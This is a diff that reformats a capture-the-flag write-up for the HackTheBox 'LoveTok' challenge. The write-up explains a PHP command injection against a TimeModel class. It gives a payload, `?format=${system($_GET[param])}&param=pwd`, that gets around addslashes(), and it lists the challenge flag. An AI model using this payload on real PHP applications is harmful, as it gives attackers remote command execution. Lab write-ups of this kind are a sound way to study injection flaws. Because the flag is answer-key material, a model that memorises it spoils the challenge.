@@ -1,9 +1,11 @@
 # LoveTok
+
 > From HackTheBox: [LoveTok](https://app.hackthebox.com/challenges/lovetok)
 
 ## Solution
 
 Download the source code and focus on `TimeModel.php`:
+
 ```php
 <?php
 class TimeModel
@@ -23,19 +25,20 @@ class TimeModel
     }
 }
 ```
-We can use `Command Injection` (like that: `?format=${system($_GET['pwd'])}`) here but having to bypass `addslashes()` [function](https://www.php.net/manual/en/function.addslashes.php)
-because the single quote `'` is added slash.
 
-Payload: `?format=${system($_GET[param])}&param=pwd`
-![img.png](img.png)
+We can use `Command Injection` (like that: `?format=${system($_GET['pwd'])}`) here but having to bypass `addslashes()` [function](https://www.php.net/manual/en/function.addslashes.php) because the single quote `'` is added slash.
 
-Next using `ls` and `cat` to get the flag:
-![img_1.png](img_1.png)
-![img_2.png](img_2.png)
+Payload: `?format=${system($_GET[param])}&param=pwd` ![img.png](img.png)
+
+Next using `ls` and `cat` to get the flag: &#x20;
+
+<figure><img src="img_2.png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="img_1.png" alt=""><figcaption></figcaption></figure>
 
 Flag: `HTB{wh3n_l0v3_g3ts_eval3d_sh3lls_st4rt_p0pp1ng}`
 
 ## References
-+ https://swordandcircuitboard.com/php-addslashes-command-injection-bypass/
-+ https://www.php.net/manual/en/function.addslashes.php
 
+* https://swordandcircuitboard.com/php-addslashes-command-injection-bypass/
+* https://www.php.net/manual/en/function.addslashes.php
